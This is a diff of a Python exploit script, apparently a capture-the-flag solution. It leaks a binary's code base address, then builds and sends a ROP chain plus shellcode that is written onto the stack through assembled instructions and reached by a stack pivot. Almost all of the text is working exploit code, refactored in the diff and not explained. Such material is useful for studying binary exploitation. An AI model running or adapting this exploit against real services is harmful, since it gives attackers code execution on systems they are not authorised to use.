@@ -28,28 +28,11 @@ def movb_r15(n):
     else:
         return assemble('xor r15, r15') + assemble('inc r15') * n
 
-#
-# stack based programming
-#
 def store_r15(stack_off):
     return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov [r14], r15')
 
 def load_to_r15(stack_off):
     return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov r15, [r14]')
-
-def mov_r15_retaddr():
-    return assemble('mov r15,[rsp]')
-
-def write_string(stack_off, s):
-    encoding = ''
-    for c in s:
-        encoding += movb_r15(ord(c))
-        encoding += store_r15(stack_off)
-        stack_off += 1
-    return encoding
-
-def s(asm):
-    r.send(assemble(asm))
 
 # add rsp,0x1000 -> push rsp into 'rw-' region
 adjust_stack = "\x48\x81\xC4\x00\x10\x00\x00" 
@@ -82,7 +65,7 @@ if __name__ == "__main__":
     r.send(assemble('dec r14; ret') * (0xb18 - 0x8a2))
     recv_all()
 
-    s('push rsp; pop rsi; push r14')
+    r.send(assemble('push rsp; pop rsi; push r14'))
     d = recv_all()
     l = d[len(d)-6:len(d)] + '\x00\x00'
     l = u64(l)
@@ -90,24 +73,26 @@ if __name__ == "__main__":
     log.info("code base: 0x%x" % B)
 
     pop_rdi = 0xbc3 # pop rdi; ret
-
     offset = 56
 
     log.info("building opcodes...")
 
-    buf = ''
-    buf += p64(B + pop_rdi)             # 0x0
-    buf += p64(0)                       # 0x8
-    buf += p64(B + b.plt['alarm'])      # 0x10
-    buf += p64(B + pop_rdi)             # 0x18
-    buf += p64(0xcafebabe)              # 0x20
-    buf += p64(B + 0xa20)               # 0x28
-    buf += p64(0xcafebabe)              # 0x30
-    buf += adjust_stack                 # 0x38
-    buf += shellcode
+    bytes = ''
+    bytes += p64(B + pop_rdi)               # 0x0
+    bytes += p64(0)                         # 0x8
+    bytes += p64(B + b.plt['alarm'])        # 0x10
+    bytes += p64(B + pop_rdi)               # 0x18
+    bytes += p64(0xcafebabe)                # 0x20
+    bytes += p64(B + 0xa20)                 # 0x28
+    bytes += p64(0xcafebabe)                # 0x30
+    bytes += adjust_stack                   # 0x38
+    bytes += shellcode
 
     op = ''
-    op += write_string(offset, buf)
+    op += assemble('push rsp; pop r14')
+    op += assemble('inc r14') * offset
+    for x in bytes:
+        op = op + assemble('movb [r14], %#x' % ord(x)) + assemble('inc r14')
 
     op += assemble('mov r14,rcx')
     op += assemble('push rsp; pop r15')
@@ -121,7 +106,7 @@ if __name__ == "__main__":
     op += store_r15(offset + 0x30)
 
     op += movb_r15(offset)
-    op += assemble('add rsp,r15; ret')
+    op += assemble('add rsp,r15; ret')      # stack pivot
 
     log.info("sending %d bytes..." % len(op))
     r.send(op)
